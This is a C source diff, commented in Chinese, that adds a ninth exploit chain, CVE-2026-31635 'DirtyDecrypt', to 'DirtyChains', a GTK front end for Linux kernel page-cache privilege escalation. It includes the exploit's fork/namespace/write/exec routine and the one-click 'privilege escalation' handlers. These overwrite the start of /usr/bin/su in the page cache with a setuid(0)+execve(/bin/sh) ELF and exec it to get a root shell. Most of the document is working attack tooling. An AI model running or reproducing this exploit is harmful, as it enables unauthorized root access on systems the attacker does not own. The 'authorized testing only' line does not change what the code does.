+        printf("[*] 原文件已备份: %s\n    恢复: cp %s %s\n",
+               backup, backup, dc31635_target);
+    else
+        printf("[!] 备份失败（%s），出问题只能重装包恢复\n", strerror(errno));
+
+    pid = fork();
+    if (pid < 0) {
+        fprintf(stderr, "fork: %s\n", strerror(errno));
+        munmap(map, 4096);
+        close(rfd);
+        return 1;
+    }
+    if (pid == 0) {
+        /* 子进程进 userns/netns 干活；父进程留在外层，成功后才能 exec 出真 root */
+        if (dc31635_setup_ns() < 0)
+            _exit(4);
+        _exit(dc31635_write_payload(rfd, map, file_size) == 0 ? 0 : 1);
+    }
+
+    if (waitpid(pid, &status, 0) < 0) {
+        munmap(map, 4096);
+        close(rfd);
+        return 1;
+    }
+    munmap(map, 4096);
+    close(rfd);
+
+    if (!WIFEXITED(status)) {
+        printf("[-] 子进程被信号终止\n");
+        return 1;
+    }
+    rc = WEXITSTATUS(status);
+    if (rc != 0) {
+        printf("%s", rc == 4 ? "[-] 前置条件不满足（userns 被禁？）\n"
+                             : "[-] 写原语失败, 没打成\n");
+        if (backup[0])
+            printf("[*] 目标可能已被部分改写, 恢复: cp %s %s\n",
+                   backup, dc31635_target);
+        return rc;
+    }
+
+    printf("[+] 目标前 %d 字节已改写（页缓存，未落盘）\n", DC31635_PAYLOAD_LEN);
+
+    if (mode == 0) {
+        printf("[*] exec %s\n", dc31635_target);
+        fflush(NULL);
+        execl(dc31635_target, dc31635_target, (char *)NULL);
+        fprintf(stderr, "exec %s: %s\n", dc31635_target, strerror(errno));
+        return 1;
+    }
+    return 0;
+}
+
 #define APP_TITLE       "DirtyChains · 页缓存提权"
 /* 构建标识: 标题栏副标题上直接显示, 用来确认跑的是不是最新这份 */
-#define DF_BUILD        "2026-11-01-r35"
-#define APP_SUBTITLE    "八链 PoC 图形前端 · " DF_BUILD
+#define DF_BUILD        "2026-11-01-r36"
+#define APP_SUBTITLE    "九链 PoC 图形前端 · " DF_BUILD
 #define LOG_MAX_LINES   20000
 #define PTY_COLS        110
 #define PTY_ROWS        32
@@ -5927,6 +6782,12 @@ static const Chain chains[] = {
       "ESP 的 esn.seq_hi 被当明文写回页缓存, 一个 SA 带 4 字节",
       "需非特权 userns + XFRM espinudp(4500)；192 字节载荷 = 48 个 SA", 3,
       1, 0, 1 },
+
+    { "-2026-31635", "31635 · DirtyDecrypt",
+      "CVE-2026-31635  RxRPC / RXGK",
+      "rxgk 解密原地写回页缓存, 逐字节猜 key, 换掉目标整段 ELF 头",
+      "需非特权 userns + AF_RXRPC + rxgk(security index 6)；120 字节载荷", 4,
+      1, 0, 0 },
 };
 #define N_CHAINS ((int)(sizeof(chains) / sizeof(chains[0])))
 
@@ -5934,7 +6795,8 @@ static const Chain chains[] = {
  * 侧栏类别表。单链类 (members == NULL) 点击直接切链;
  * 多链类点击后弹窗, 让用户在同一类里挑具体漏洞。
  */
-static const int cat_write_members[] = { 0, 1, 6, 7 }; /* 31431 / 43284 / 46300 / 43503 */
+static const int cat_write_members[] = { 0, 1, 6, 7, 8 };
+/* 31431 / 43284 / 46300 / 43503 / 31635 */
 static const int cat_oob_members[]   = { 2, 4, 5 }; /* 43500 / 46331 / 64531 */
 
 static const struct {
@@ -6646,8 +7508,8 @@ static void on_child_exit(GPid pid, gint status, gpointer data)
             return;
         }
 
-        /* CVE-2026-43503 这条和主引擎一致: 0 = 写成功, 1 = 没打成 */
-        if (cc && cc->engine == 3) {
+        /* CVE-2026-43503 / 31635 这两条和主引擎一致: 0 = 写成功, 1 = 没打成 */
+        if (cc && (cc->engine == 3 || cc->engine == 4)) {
             char line[200];
 
             switch (code) {
@@ -6765,7 +7627,8 @@ static gboolean app_spawn(App *a, char **args, const char *what)
     int eng = c ? c->engine : 0;
     const char *esw = (eng == 1) ? "--ovs"
                     : (eng == 2) ? "--frag"
-                    : (eng == 3) ? "--cve43503" : "--engine";
+                    : (eng == 3) ? "--cve43503"
+                    : (eng == 4) ? "--cve31635" : "--engine";
     char eflag[16] = "";
 
     if (eng != 0 && !a->poc_builtin) {
@@ -6933,7 +7796,7 @@ static void update_desc(App *a)
 
     if (idx == 0) {
         gtk_label_set_markup(GTK_LABEL(a->lbl_name),
-                             "<b>全部（dirtychains 八链）</b>");
+                             "<b>全部（dirtychains 九链）</b>");
         gtk_label_set_text(GTK_LABEL(a->lbl_desc),
                            "检查配置与自测会依次跑完 dirtychains 各链；OVS 链与 Fragnesia 链请单独选择后再操作。");
         gtk_label_set_text(GTK_LABEL(a->lbl_need), "");
@@ -7204,6 +8067,21 @@ static void act_check(GtkWidget *w, gpointer data)
         return;
     }
 
+    if (c && c->engine == 4) {
+        const char *tg = entry_text(a->entry_target);
+        char *dd_args[4];
+        int k = 0;
+
+        dd_args[k++] = "-check";
+        if (tg) {
+            dd_args[k++] = "-t";
+            dd_args[k++] = (char *)tg;
+        }
+        dd_args[k] = NULL;
+        app_spawn(a, dd_args, "检查 DirtyDecrypt 前置条件");
+        return;
+    }
+
     if (c && c->engine == 1) {
         char *ovs_args[] = { "-check", NULL };
 
@@ -7291,6 +8169,31 @@ static void act_test(GtkWidget *w, gpointer data)
         return;
     }
 
+    if (c && c->engine == 4) {
+        const char *tg = entry_text(a->entry_target);
+        char *dd_args[4];
+        char cmd[600];
+        int k = 0;
+
+        dd_args[k++] = "-test";
+        if (tg) {
+            dd_args[k++] = "-t";
+            dd_args[k++] = (char *)tg;
+        }
+        dd_args[k] = NULL;
+
+        g_snprintf(cmd, sizeof(cmd), "%s --cve31635 -test -t %s",
+                   a->poc_path, tg ? tg : "/usr/bin/su");
+        if (!confirm_run(a, "DirtyDecrypt 自测", cmd,
+                         "会把目标文件前 120 字节的页缓存换成一段 "
+                         "setuid(0)+execve(/bin/sh) 的 ELF（改完不 exec 目标）。"
+                         "这条是逐字节暴力猜 key，约 1/256 命中一字节，"
+                         "120 字节通常要几万次 fire、耗时以分钟计。"))
+            return;
+        app_spawn(a, dd_args, "自测 DirtyDecrypt 写原语");
+        return;
+    }
+
     if (c && c->engine == 1) {
         char *ovs_args[] = { "-scan", NULL };
 
@@ -7336,7 +8239,7 @@ static void act_lpe(GtkWidget *w, gpointer data)
     if (!c) {
         show_info(a, GTK_MESSAGE_INFO, "需要选择一条链",
                   "请先在上方选择具体的 CVE。",
-                  "「全部七条链」只用于配置检查与自测；"
+                  "「全部八条链」只用于配置检查与自测；"
                   "提权和通用写必须指定其中一条。");
         return;
     }
@@ -7401,6 +8304,32 @@ static void act_lpe(GtkWidget *w, gpointer data)
                          "整个过程约 8 秒。"))
             return;
         app_spawn(a, cl_args, "一键提权");
+        return;
+    }
+
+    /* DirtyDecrypt 链：同样是把目标开头的页换成 tiny ELF，再 exec 它 */
+    if (c->engine == 4) {
+        const char *tg = entry_text(a->entry_target);
+        char *dd_args[4];
+        char dd_cmd[600];
+        int k = 0;
+
+        dd_args[k++] = "-start";
+        if (tg) {
+            dd_args[k++] = "-t";
+            dd_args[k++] = (char *)tg;
+        }
+        dd_args[k] = NULL;
+
+        g_snprintf(dd_cmd, sizeof(dd_cmd), "%s --cve31635 -start -t %s",
+                   a->poc_path, tg ? tg : "/usr/bin/su");
+        if (!confirm_run(a, c->name, dd_cmd,
+                         "会把目标文件前 120 字节的页缓存换成一段 "
+                         "setuid(0)+execve(/bin/sh) 的 ELF，然后 exec 该文件 —— "
+                         "成功即拿到 root shell。逐字节猜 key，耗时以分钟计；"
+                         "写之前会自动备份到 /tmp，失败按日志里的 cp 命令恢复。"))
+            return;
+        app_spawn(a, dd_args, "一键提权");
         return;
     }
 
@@ -10162,7 +11091,7 @@ static void build_window(App *a)
      */
     a->combo = gtk_combo_box_text_new();
     gtk_combo_box_text_append_text(GTK_COMBO_BOX_TEXT(a->combo),
-                                   "全部（dirtychains 八链，仅检查 / 自测）");
+                                   "全部（dirtychains 九链，仅检查 / 自测）");
     {
         int i;
         for (i = 0; i < N_CHAINS; i++) {
@@ -10432,6 +11361,18 @@ int main(int argc, char **argv)
         return rc;
     }
 
+    /* 第五条内置引擎: CVE-2026-31635 (DirtyDecrypt) */
+    if (argc > 1 && !strcmp(argv[1], "--cve31635")) {
+        int rc;
+
+        argv++;
+        argc--;
+        argv[0] = (char *)"dirtychains";
+        rc = cve31635_main(argc, argv);
+        fflush(NULL);
+        return rc;
+    }
+
     memset(&app, 0, sizeof(app));
     app.master_fd = -1;
     app.cur_fg = -1;
@@ -10490,7 +11431,7 @@ int main(int argc, char **argv)
     {
         char head[512];
         g_snprintf(head, sizeof(head),
-                   "\033[36mDirtyChains 八链页缓存提权 PoC\033[0m  图形前端"
+                   "\033[36mDirtyChains 九链页缓存提权 PoC\033[0m  图形前端"
                    "  \033[2m构建 %s\033[0m\n"
                    "\033[2m引擎: %s\033[0m\n"
                    "\033[2m仅供参考与授权测试。先用「检查配置」和「自测」判断本机可用性。\033[0m\n",
